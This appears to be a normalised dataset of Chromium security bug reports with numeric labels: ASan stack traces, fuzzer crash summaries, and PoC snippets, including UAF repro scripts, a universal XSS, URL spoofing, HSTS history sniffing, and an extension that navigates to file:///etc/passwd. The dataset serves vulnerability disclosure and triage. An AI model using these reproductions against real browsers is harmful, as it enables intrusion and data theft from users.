local v8 function v8 local v8 value int v8 local v8 value v8 isolate mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:154:40 11 in blink scriptcontroller callfunction v8 local v8 function v8 local v8 value int v8 local v8 value mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:148:12 12 in blink v8lazyeventlistener calllistenerfunction blink scriptstate v8 local v8 value blink event mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:100:10 13 in blink v8abstracteventlistener invokeeventhandler blink scriptstate blink event v8 local v8 value mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:125:23 14 in blink v8abstracteventlistener handleevent blink scriptstate blink event mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:100:5 15 in blink v8abstracteventlistener handleevent blink executioncontext blink event mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:85:5 16 in blink eventtarget fireeventlisteners blink event blink eventtargetdata wtf vector blink registeredeventlistener 1ul wtf defaultallocator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:356:9 17 in blink eventtarget fireeventlisteners blink event mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:292:9 18 in blink localdomwindow dispatchevent wtf passrefptr blink event wtf passrefptr blink eventtarget mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1402:12 19 in blink localdomwindow dispatchloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1374:9 20 in dispatchwindowloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:372:5 21 in blink localdomwindow documentwasclosed mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:377:0 22 in blink document implicitclose mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:2491:9 23 in blink frameloader checkcompleted mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:501:9 24 in blink frameloader finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:419:5 25 in blink document finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:4529:9 26 in blink htmltreebuilder finished mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:2806:5 27 in end mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:853:5 28 in attempttorundeferredscriptsandend mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:866:0 29 in blink htmldocumentparser preparetostopparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:272:0 30 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:510:13 31 in blink htmldocumentparser pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:563:36 32 in blink htmldocumentparser resumeparsingafteryield mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:307:5 33 in blink cancellabletaskfactory cancellabletask run mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/platform/scheduler/cancellabletaskfactory.cpp:29:9 34 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:157:12 35 in makeitso mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:293:0 36 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webthread task base defaultdeleter blink webthread task void scoped_ptr blink webthread task base defaultdeleter blink webthread task base internal typelist base internal passedwrapper scoped_ptr blink webthread task base defaultdeleter blink webthread task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webthread task base defaultdeleter blink webthread task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webthread task base defaultdeleter blink webthread task base internal typelist scoped_ptr blink webthread task base defaultdeleter blink webthread task void run base internal bindstatebase mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:343:0 37 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396:12 38 in base debug taskannotator runtask char const char const base pendingtask const mnt/data/b/build/slave/asan_release/build/src/out/release base/debug/task_annotator.cc:62:0 39 in scheduler taskqueuemanager processtaskfromworkqueue unsigned long bool base pendingtask mnt/data/b/build/slave/asan_release/build/src/out/release components/scheduler/child/task_queue_manager.cc:674:5 40 in scheduler taskqueuemanager dowork bool mnt/data/b/build/slave/asan_release/build/src/out/release components/scheduler/child/task_queue_manager.cc:627:9 41 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:176:12 42 in makeitso mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:303:0 43 in base internal invoker base indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void scheduler taskqueuemanager bool void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr scheduler taskqueuemanager base internal unwraptraits bool base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager const bool const void run base internal bindstatebase mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:343:0 44 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396:12 45 in base debug taskannotator runtask char const char const base pendingtask const mnt/data/b/build/slave/asan_release/build/src/out/release base/debug/task_annotator.cc:62:0 46 in base messageloop runtask base pendingtask const mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:458:3 47 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:468:5 48 in base messageloop dowork mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:580:0 49 in base messagepumpdefault run base messagepump delegate mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:34:21 50 in base runloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55:3 51 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:286:3 52 in content renderermain content mainfunctionparams const mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:220:7 53 in content runzygote content mainfunctionparams const content contentmaindelegate mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:312:14 54 in content runnamedprocesstypemain std 1 basic_string char std 1 char_traits char std 1 allocator char const content mainfunctionparams const content contentmaindelegate mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:396:12 55 in content contentmainrunnerimpl run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:801:12 56 in content contentmain content contentmainparams const mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19:15 57 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66:12 58 in libc_start_main build/buildd/glibc-2.21/csu/libc-start.c:289:0 addresssanitizer can not provide additional info summary addresssanitizer segv home/nils/monkeychrome/asan-linux-release-333230/chrome 23243==aborting version chrome version asan-linux-release-333230 operating system linux reproduction case script function start objs new array objs 0 document.createelement iframe objs 1 document.body objs 2 document.createelement rt objs 24 new domparser parsefromstring b b text/html objs 25 document.documentelement objs 119 document.createelement input objs 120 new promise f=function then f objs 150 document.createelement input objs 120 proto__=objs 150 proto try for var x=0 x 254 x if objs x objs x offsetheight catch e for var x=0 x 285 x if objs x objs x offsetheight script body onload start body for crashes please include the following additional information type of crash tab	9
security purecall on cpwl_edit onkillfocus vulnerability details bug reported in issue 537173 reproduces again attached test case crashes with a purecall please open test.pdf file in a pdf editor to see javascript code which triggers purecall javascript is available in document will close action version chrome version 49.0.2606.0 tot debug build operating system windows 10 reproduction case 1 build chrome debug build ninja c out\debug chrome 2 run chrome debug build 3 open test.pdf in chrome 4 attach visual studio debugger to chrome pdf process 5 press reload button in chrome 6 the debugger will fail with purecall debug break for crashes please include the following additional information type of crash pdf plugin process crash state base.dll anonymous namespace purecall line 26 external code frames below may be incorrect and/or missing no symbols loaded for msvcr120d.dll chrome.dll cpwl_edit onkillfocus line 696 chrome.dll cpwl_msgcontrol killfocus line 157 chrome.dll cpwl_wnd killfocus line 720 chrome.dll cpwl_wnd destroy line 248 chrome.dll cffl_formfiller cffl_formfiller line 29 chrome.dll cffl_textfield cffl_textfield line 20 external code chrome.dll cffl_iformfiller unregisterformfiller cpdfsdk_annot pannot line 554 chrome.dll cffl_iformfiller ondelete cpdfsdk_annot pannot line 119 chrome.dll cpdfsdk_bfannothandler releaseannot cpdfsdk_annot pannot line 358 chrome.dll cpdfsdk_annothandlermgr releaseannot cpdfsdk_annot pannot line 67 chrome.dll cpdfsdk_pageview cpdfsdk_pageview line 612 external code chrome.dll cpdfsdk_document cpdfsdk_document line 396 external code chrome.dll fpdfdoc_exitformfillenvironment void hhandle line 105 chrome.dll chrome_pdf pdfiumengine pdfiumengine line 617	7
use-of-uninitialized-value in blink encodepixels detailed report fuzzer cdiehl_dharma job type linux_msan_chrome platform id linux crash type use-of-uninitialized-value crash address crash state blink encodepixels blink jpegimageencoder encode blink imagedatabuffer encodeimage regressed minimized testcase 0.21 kb filer inferno see for more information	7
security url spoofing when victim tries to access another website from attacker s page vulnerability details this vulnerability makes it possible to display arbitrary content under the url of the website that the user is trying to access from the attacker s page through the omnibox version chrome version 45.0.2454.101 m stable i tested it too on 47.0.2520.0 canary and it works operating system windows 7 ultimate 32x service pack 1 reproduction case 1 access 2 type in the omnibox and press enter 3 a fake error page should appear under google s url	11
privacy browser history sniffing attack using hsts csp this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details i wrote a poc for reliably sniffing browser history in chrome/firefox by observing which domains have associated hsts entries i showed it to chris palmer who suggested i file it here the code is pretty well-commented but basically it works like this 1 user visits attacker page 2 browser attempts to load images from various hsts domains over http 3 attacker has set a csp policy that restricts images to http so image sources are blocked before they are redirected to https this is crucial if the browser completes a request to the https site then it will receive the hsts pin and the attack will no longer work when the user visits the page again 4 when an image gets blocked by csp its onerror handler is called in this case the onerror handler does some tricks to time how long it took for the image to be redirected from http to https if this time is on the order of a millisecond it was an hsts redirect no network request was made which means the user has visited the image s domain before if it s on the order of 100 milliseconds then a network request probably occurred meaning that the user has n't visited the image s domain this also works in incognito mode can see which hosts the user has visited in their non-incognito session and chrome on android i have n't tried other platforms please note this will be shown as part of a demo of new browser fingerprinting methods at toorcon next sunday 10/25 version chrome version 46.0.2490.71 stable operating system osx 10.10.4 reproduction case live demo at source files also attached please do n't share the link	7
window.crypto.getrandomvalues uses a weak csprng useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/46.0.2490.71 safari/537.36 steps to reproduce the problem window.crypto.getrandomvalues is no longer a cryptographically strong pseudorandom number generator what is the expected behavior what went wrong the cryptographic primitive that window.crypto.getrandomvalues is based on is no longer secure it is using the openbsd implementation of rc4 called arc4 see rc4 is no longer considered secure and as such window.crypto.getrandomvalues can no longer be considered a cryptographically strong pseudorandom number generator see analysis of rc4 at security etc the tlsv1.3 draft will also drop rc4 negotiation entirely see many of those issues have to do with tls of which window.crypto.getrandomvalues does not depend on but the attacks are generic enough that they are still applicable here rc4 and thus arc4random is no longer secure openbsd dropped arc4random for its kernel-space csprng and implemented chacha20 which is in boringssl libressl and proposed for the stream cipher in tlsv1.3 see revision 1.25 it seems like a direct replacement of arc4random with chacha20 would also be applicable here firefox seems to be reading from the operating system s csprng directly that could be another alternative gnu/linux uses sha-1 mac os x uses yarrow and windows uses aes-ctr bcrypt_rng_algorithm did this work before n/a chrome version 46.0.2490.71 channel stable os version debian sid flash version shockwave flash 18.0 r0	4
pdfium heap-buffer-overflow in sycc422_to_rgb vulnerability details with a pdf file containing a malformed jpeg2000 image it is possible to cause an out-of-bounds read in the openjpeg library used in pdfium the code in question shortened for brevity from fx_codec_jpx_opj.cpp:216 for i 0 i maxh i for j 0 opj_uint32 j maxw opj_uint32 1 j 2 sycc_to_rgb offset upb y cb cr r g b snip cr the asan failure says heap-buffer-overflow on address the dereferencing of cr is the offending instruction without asan the loop continues to read from outside the heap-buffer gdb p cr 9 const int asan report top 10 frames 18448==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in sycc422_to_rgb third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:217:36 1 in color_sycc_to_rgb opj_image third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:416 2 in cjpx_decoder init unsigned char const int third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:757:5 3 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj cpp:870:8 4 in context third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:75:28 5 in cpdf_dibsource loadjpxbitmap third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:709 6 in cpdf_dibsource createdecoder third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:655:5 7 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int i nt third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:371:13 8 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int thir d_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:308:7 9 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int third_party/pdfium/co re/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:143:13 10 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1559:11 is located 0 bytes to the right of 8656972-byte region allocated by thread t0 here 0 in interceptor_calloc home/keve/src/chromium/asan-linux-stable-46.0.2490.86/pdfium_test 1 in opj_j2k_update_image_data third_party/pdfium/third_party/libopenjpeg20/j2k.c:8157:57 2 in opj_j2k_decode_tiles third_party/pdfium/third_party/libopenjpeg20/j2k.c:9603:23 3 in opj_j2k_exec third_party/pdfium/third_party/libopenjpeg20/j2k.c:7286:41 4 in opj_j2k_decode third_party/pdfium/third_party/libopenjpeg20/j2k.c:9796 5 in opj_jp2_decode third_party/pdfium/third_party/libopenjpeg20/jp2.c:1483:8 6 in cjpx_decoder init unsigned char const int third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:736:11 7 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj cpp:870:8 8 in context third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:75:28 9 in cpdf_dibsource loadjpxbitmap third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:709 10 in cpdf_dibsource createdecoder third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:655:5 version pdfium_test from asan-linux-stable-46.0.2490.86 reproduction case attached file crashes pdfium_test on linux 64-bit	7
security uaf in midihost round 2 js browser code execution looks like the fix for bug 564501 was n't sufficient it is still possible to cause a uaf in the following code void midimanager receivemididata uint32_t port_index const uint8_t data size_t length double timestamp base autolock auto_lock lock for auto client clients client receivemididata port_index data length timestamp void midihost receivemididata uint32_t port const uint8_t data size_t length double timestamp trace_event0 midi midihost receivemididata base autolock auto_lock messages_queues_lock while true send to the renderer send new midimsg_datareceived port message timestamp will cause uaf on the io thread since receivemididata is called from a separate thread event_thread in midimanageralsa browsermessagefilter send will bool browsermessagefilter send ipc message message if browserthread currentlyon browserthread io browserthread posttask browserthread io from_here base bind base ignoreresult browsermessagefilter send this message return true post the send task to the io thread although the auto_lock in midimanager receivemididata will prevent the uaf on the client within that function it could still be freed and subsequently be used on the io thread virtual call to browsermessagefilter send on the freed midihost	11
security chromeos-base/chromeos-ca-certificates is out of date the package chromeos-base/chromeos-ca-certificates is meant to reflect the set of roots from however this list was updated in august 2015 and the chromeos package is out of date as a result it contains a number of cas who are not and have not been actively audited for several years and includes some cas for which no one in the industry knows what happens to the private keys we should n't be trusting those	11
heap-buffer-overflow in blink appendcharactersreplacingentitiesinternal unsigned char const detailed report fuzzer bj_broddelwerk job type windows_syzyasan_chrome platform id windows crash type heap-buffer-overflow read 1 crash address crash state blink appendcharactersreplacingentitiesinternal unsigned char const blink markupformatter appendcharactersreplacingentities blink styledmarkupaccumulator appendtext regressed minimized testcase 4.82 kb filer inferno see for more information	11
uaf in blink searchinputtype didsetvaluebyuseredit in third_party/webkit/source/core/html/forms/searchinputtype.cpp void searchinputtype startsearcheventtimer assert element layoutobject unsigned length element innereditorvalue length if length stopsearcheventtimer element onsearch can change the type here return after typing the first key we wait 0.5 seconds after the second key 0.4 seconds then 0.3 then 0.2 from then on m_searcheventtimer.startoneshot max 0.2 0.6 0.1 length blink_from_here uaf element onsearch could call a user defined handler changing the type of the input and freeing the searchinputtype this leading to a use after free when m_searcheventtimer.startoneshot is called this can be reached by a search input element with an incremental attribute when either a user clears the input manually or if input.focus input.setrangetext start end is called repro body script input document.createelement input input.type search input.setattribute incremental input.value 1 input.onsearch function input.type text input.focus input.setrangetext 0 1 script body	11
use-of-uninitialized-value in blink cachingwordshapeiterator nextword detailed report fuzzer bj_broddelwerk job type linux_msan_chrome platform id linux crash type use-of-uninitialized-value crash address crash state blink cachingwordshapeiterator nextword blink cachingwordshapeiterator next blink shaperesultsforrun minimized testcase 4.40 kb filer inferno see for more information	11
heap-use-after-free in blink frameloader init detailed report fuzzer inferno_twister job type linux_asan_chrome_media platform id linux crash type heap-use-after-free read 8 crash address crash state blink frameloader init blink weblocalframeimpl initializecoreframe blink weblocalframeimpl createchildframe minimized testcase 0.27 kb download 47otbb177b r qy6z1vf j tn 2b hfdpm fr rs 9k lqb script var observer new mutationobserver function tcf6.parentnode.removechild tcf6 delete tcf6 tcf6 null try catch e observer.observe document.body childlist true script iframe id=tcf6 filer inferno see for more information	11
heap-buffer-overflow in blink markupformatter appendcharactersreplacingentities detailed report fuzzer ochang_domfuzzer job type linux_asan_chrome_v8_arm platform id linux crash type heap-buffer-overflow read 1 crash address crash state blink markupformatter appendcharactersreplacingentities blink styledmarkupaccumulator appendtext blink styledmarkupaccumulator appendtextwithinlinestyle regressed minimized testcase 0.68 kb download style id dom-fuzz-14760002 div first-letter webkit-initial-letter 2 3 margin-right:2px margin-left:2px style body script function domfuzz_removeattribute document.designmode on document.execcommand selectall document.execcommand insertorderedlist document.execcommand insertparagraph document.execcommand insertunorderedlist document.execcommand inserttext false a combination of green and blue not document.execcommand selectall document.execcommand inserthtml false paragraph document.execcommand selectall document.execcommand inserttext false bk document.execcommand insertunorderedlist script filer ochang see for more information	11
heap-buffer-overflow in opj_j2k_read_mcc detailed report uploader mjurczyk google.com job type linux_asan_pdfium platform id linux crash type heap-buffer-overflow read 4 crash address crash state opj_j2k_read_mcc opj_j2k_read_header_procedure opj_j2k_read_header unminimized testcase filer mjurczyk see for more information	11
heap-use-after-free in webrtc vcmgenericdecoder release detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_chrome_chromeos platform id linux crash type heap-use-after-free read 8 crash address crash state webrtc vcmgenericdecoder release webrtc vcmcodecdatabase deregisterexternaldecoder webrtc vcm videoreceiver registerexternaldecoder unminimized testcase additional requirements requires http filer pbos see for more information	11
tracking bug for internal fixes chrome m48 release 0 critical high medium low	11
heap-use-after-free in content bindwebgraphicscontext3dglcontextcallback detailed report fuzzer ochang_domfuzzer job type linux_asan_chrome_mp platform id linux crash type heap-use-after-free read 8 crash address crash state content bindwebgraphicscontext3dglcontextcallback grglrendertarget onrelease virtual thunk to grgltexturerendertarget onrelease unminimized testcase additional requirements requires gestures filer ochang see for more information	11
heap-buffer-overflow in opj_jp2_apply_pclr detailed report uploader mjurczyk google.com job type linux_asan_pdfium platform id linux crash type heap-buffer-overflow read 4 crash address crash state opj_jp2_apply_pclr opj_jp2_decode opj_decode unminimized testcase filer mjurczyk see for more information	11
use-of-uninitialized-value in filter8 detailed report fuzzer phoglund_webrtc_peerconnection job type linux_msan_chrome platform id linux crash type use-of-uninitialized-value crash address crash state filter8 vpx_lpf_vertical_8_c filter_selectively_vert_row2 minimized testcase 2.29 kb additional requirements requires http filer mbarbella see for more information	11
freetype pick up post-2.6.1 patches or 2.6.2 when it s out in bug 534621 freetype in clank and on chrome os was updated to 2.6.1 one patch even after that there have been a sequence of patches affecting the security out of bound huge memory allocation etc landed in the trunk not all of them are relevant to chrome some font formats are never supported by chrome for instance but some can potentially impact chrome cherry-picking would be tricky and we may as well ask the upstream to release yet another minor version 2.6.2 and update ours to that version changelog bug list most of them found by fuzzing and reported by kcc and bungeman	11
use-of-uninitialized-value in winding_mono_conic detailed report fuzzer inferno_canvas_wrecker job type linux_msan_chrome platform id linux crash type use-of-uninitialized-value crash address crash state winding_mono_conic skpath contains blink path contains regressed minimized testcase 0.60 kb filer inferno see for more information	11
heap-buffer-overflow in net hpackencoder encodeheaderset detailed report uploader mbarbella google.com job type hpack_fuzz_wrapper platform id linux crash type heap-buffer-overflow read 1 crash address crash state net hpackencoder encodeheaderset net hpackfuzzutil runheaderblockthroughfuzzerstages main regressed minimized testcase 0.42 kb filer mbarbella see for more information	11
heap-use-after-free in blink frameselection notifylayoutobjectofselectionchange detailed report fuzzer inferno_layout_test_unmodified job type linux_asan_chrome_mp platform id linux crash type heap-use-after-free read 8 crash address crash state blink frameselection notifylayoutobjectofselectionchange void blink frameselection setselectionalgorithm blink editingalgorithm blink blink frameselection moveto minimized testcase 0.72 kb filer inferno see for more information	11
heap-use-after-free in blink shapeoutsideinfo isenabledfor detailed report fuzzer mbarbella_js_mutation_layout job type linux_lsan_chrome_mp platform id linux crash type heap-use-after-free read 8 crash address crash state blink shapeoutsideinfo isenabledfor blink layoutbox shapeoutsideinfo blink computefloatoffsetforlinelayoutadapter regressed minimized testcase 0.84 kb download p script function f_3 f_2.apply function f_2 possibledelimiter message var v_5 document.createelement v_5 document.body.appendchild v_5 script style container background-size:50 float right canvas-image canvas-padding display table-cell style div class container canvas id canvas-padding div pre id layer-tree script var test0=document.getelementbyid canvas-padding var test2=document.getelementbyid layer-tree document.execcommand usecss f_3 test2.appendchild test0.clonenode test2.style position absolute var stylesheet0 document.stylesheets 0 stylesheet0.insertrule container display table 0 document.execcommand false document.body.style.zoom=0.50 script filer mbarbella see for more information	11
heap-use-after-free in content videocapturecontroller removeclient detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc platform id linux crash type heap-use-after-free read 8 crash address crash state content videocapturecontroller removeclient content videocapturemanager stopcaptureforclient content videocapturehost deletevideocapturecontroller regressed minimized testcase 848.99 kb filer inferno see for more information	11
websql shoud n't run a nested message loop during renderer shutdown detailed report fuzzer inferno_twister job type windows_asan_chrome_no_sandbox crash type unknown crash address crash state content renderframeimpl decidepolicyfornavigation blink frameloaderclientimpl decidepolicyfornavigation blink documentloader shouldcontinuefornavigationpolicy regressed minimized testcase 13.28 kb filer inferno	11
heap-use-after-free in ft_stream_releaseframe detailed report fuzzer ifratric_acrojs job type linux_asan_pdfium_xfa_experimental platform id linux crash type heap-use-after-free read 8 crash address crash state ft_stream_releaseframe sfnt_done_face tt_face_done minimized testcase 1400.05 kb filer inferno see for more information	11
heap-use-after-free in blink colorinputtype didchoosecolor detailed report fuzzer inferno_twister job type linux_asan_content_shell_drt platform id linux crash type heap-use-after-free read 8 crash address crash state blink colorinputtype didchoosecolor blink htmlinputelement selectcolorincolorchooser blink internals selectcolorincolorchooser regressed minimized testcase 0.22 kb download script var input document.createelement input input.type color input.oninput function this.type x-shader/x-fragment try catch e internals.selectcolorincolorchooser input ff0000 script filer inferno see for more information	11
security universal xss by circumventing the unload event vulnerability details from third_party/webkit/source/core/dom/document.cpp void document dispatchunloadevents pluginscriptforbiddenscope forbidplugindestructorscripting refptrwillberawptr document protect this if m_parser m_parser stopparsing if m_loadeventprogress loadeventnotrun return if m_loadeventprogress unloadeventinprogress if m_loadeventprogress pagehideinprogress m_loadeventprogress unloadeventhandled if this method is called while the document s m_loadeventprogress is still at loadeventnotrun then it returns without advancing m_loadeventprogress it is possible to take this branch by calling document.open which sets m_loadeventprogress to loadeventnotrun and then navigating the document without the body element the presence of which would allow m_loadeventprogress to change to beforeunloadeventcompleted before document dispatchunloadevents is called since frameloader prepareforcommit relies on document dispatchunloadevents to advance m_loadeventprogress to block the creation of new frames this allows an attacker to attach subframes that will persist in the frame tree of a cross-origin document version chrome 47.0.2526.106 stable chrome 48.0.2564.71 beta chrome 49.0.2618.8.0 dev chromium 49.0.2621.0 release build compiled today	2
security buffer overflow in brotli decompression vulnerability details a heap-based buffer overflow in brotli decompression we found the vulnerability while fuzzing with afl version chrome version 48.0.2564.97 stable operating system ubuntu 15.04 reproduction case decompressing crash.compressed with chrome s brotli causes a segmentation fault decompressing crash.compressed with brotli source on github causes a segmentation fault to deterministically reproduce the segfault aslr can be disabled even when aslr is enabled segfaults still occur with 1/10 probability through repeated attempted decompressions we are attaching two patch files for the brotli github repo and the chromium source investigation on the segmentation fault show that it is caused by a heap-based buffer overflow in decode.c:1755 chromium version under the postselfintersecting label we write past the end of s ringbuffer for our test case i is extremely large causing pos to grow to a size much larger than s ringbuffer_size for crashes please include the following additional information brotli is already deployed on chrome to decompress woff files and due to its impending larger rollout we wanted to bring this to your attention as soon as possible currently we have only caused crashes on the brotli library and command line tool but we strongly believe this vulnerability can manifest in chrome and we are working on an proof-of-concept let us know if you want more information also we noticed that firefox uses brotli as well would it be ok to report this vulnerability to mozilla	7
chrome.embeddedsearch.newtabpage.navigatecontentwindow is too powerful useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/43.0.2357.132 safari/537.36 steps to reproduce the problem 1 add the following extension to chrome begin manifest.json manifest_version 2 name evil newtab extension description this extension does evil stuff version 1.0 content_scripts matches js evilcs.js end manifest.json begin evilcs.js settimeout function file etc/passwd chrome settings foreach function url chrome.embeddedsearch.newtabpage.navigatecontentwindow url 9 3000 end evilcs.js 2 change the search engine to bing because it looks like they do n't have localized urls for the new tab page 3 open a new tab wait three seconds what is the expected behavior in my opinion chrome.embeddedsearch.newtabpage.navigatecontentwindow should not allow opening pages in incognito windows and should only permit navigation to web-accessible origins what went wrong although the extension has no permissions that allow it to navigate to chrome uris navigate to file uris or open windows in incognito mode it did all three of those things did this work before n/a chrome version 43.0.2357.132 channel stable os version flash version shockwave flash 18.0 r0 as far as i can tell this could also be pulled off by a mitm attacker with a valid ssl cert for www.bing.com if the user has changed the search engine default because they re not in the hsts preload list if flash is enabled the ability to navigate to file uris combined with the ability to download one file to the local disk but every webpage can do that lets an attacker slowly exfiltrate the contents of files on the local filesystem not the html5 local filesystem the real one see bug 487475 for details	11
zdi-can-3447 new vulnerability report google chrome pdfium jpeg2000 out-of-bounds read remote code execution vulnerability useragent mozilla/5.0 macintosh intel mac os x 10_10_5 applewebkit/537.36 khtml like gecko chrome/47.0.2526.106 safari/537.36 steps to reproduce the problem zdi-can-3447 google chrome pdfium jpeg2000 out-of-bounds read remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1 32 bit 47.0.2526.106 the bug seems to have been originated from this code index pi layno pi step_l pi resno pi step_r pi compno pi step_c pi precno pi step_p if pi include index pi include index 1 return opj_true 161c.14e4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=0860cff8 ebx=085f4ff0 ecx=00000000 edx=00000004 esi=085eea90 edi=085eea90 eip=5dc1489a esp=007fcdb0 ebp=007fcdec iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 error symbol file could not be found defaulted to export symbols for c users\zdi\appdata\local\google\chrome sxs\application\49.0.2579.0\chrome_child.dll chrome_child crashforexception 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx ds:0023:0860d000 4:044 dd eax 0860cff8 00010001 d0d0d0d0 0860d008 0860d018 0860d028 0860d038 0860d048 0860d058 0860d068 4:044 sympath srv c code\symbols symbol search path is srv c code\symbols expanded symbol search path is srv c code\symbols 4:044 reload reloading current modules 4:044 kvb childebp retaddr args to child 007fcdec 5dd9f97a 085eea90 007fce34 5de114c5 chrome_child opj_pi_next_cprl fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 542 007fcdf8 5de114c5 085eea90 085e8ff8 0830efd0 chrome_child opj_pi_next fpo non-fpo conv cdecl c 